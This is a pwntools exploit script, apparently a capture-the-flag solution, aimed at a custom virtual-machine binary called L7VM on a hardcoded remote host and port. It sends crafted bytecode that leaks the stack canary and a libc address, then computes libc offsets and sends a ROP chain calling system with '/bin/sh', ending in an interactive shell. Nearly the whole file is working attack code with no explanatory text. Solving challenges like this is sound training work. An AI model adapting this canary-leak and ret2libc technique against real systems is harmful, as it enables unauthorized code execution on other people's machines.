from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './L7VM'
HOST = '211.239.124.243'
PORT = 18607

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        # return process(TARGET)
        return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    # debug(r, [0x39dd, 0x3b93, 0x3be6, 0x3c0e])
    debug(r, [0x3e9a, 0x3e6c])

r.sendlineafter(' : ', '1')
payload = ''

# leak canary & libc
payload += '\x11\x7d\x11\x00\x21\x01\x7b\x01\x00\x07\x00'
payload += '\x11\x7d\x12\x00\x21\x01\x7b\x01\x00\x07\x00'
payload += '\x11\x7d\x13\x00\x21\x01\x7b\x01\x00\x07\x00'
payload += '\x11\x7d\x14\x00\x21\x01\x7b\x01\x00\x07\x00'

# build rop
def read_inp(reg, length):
    payload = ''
    payload += '\x21\x00\x7a\x00'
    payload += chr(reg)
    payload += p16(length)
    return payload
payload += read_inp(1, 0x20+3)

# stack to reg
payload += '\x11\x7d\x01\x00'
payload += '\x11\x7d\x02\x01'
payload += '\x11\x7d\x03\x02'
payload += '\x11\x7d\x04\x03'
payload += '\x11\x7d\x05\x04'

# reg to stack ( overwrite libc_start_main_ret )
payload += '\x11\x7c\x00\x13'
payload += '\x11\x7c\x01\x14'
payload += '\x11\x7c\x02\x15'
payload += '\x11\x7c\x03\x16'
payload += '\x11\x7c\x04\x17'

# trigger return to libc_start_main_ret
payload += '\x23'

r.sendlineafter(' : ', payload)
r.recv(1)
canary = u64(r.recvuntil('\x00'*8, True))
dbg('canary')
# r.recv(8)
leak = u64(r.recv(8))
dbg('leak')
base = leak - 0x270b3
dbg('base')
system = base + 0x55410
binsh = base + 0x1b75aa
rdi = base + 0x00026b72
payload = '\x00'*3+flat(rdi+1, rdi, binsh, system)
# payload = flat(0x1111111111111111, 0x2222222222222222, 0x3333333333333333, 0x4444444444444444, 0x5555555555555555)
r.send(payload)

r.interactive()
r.close()
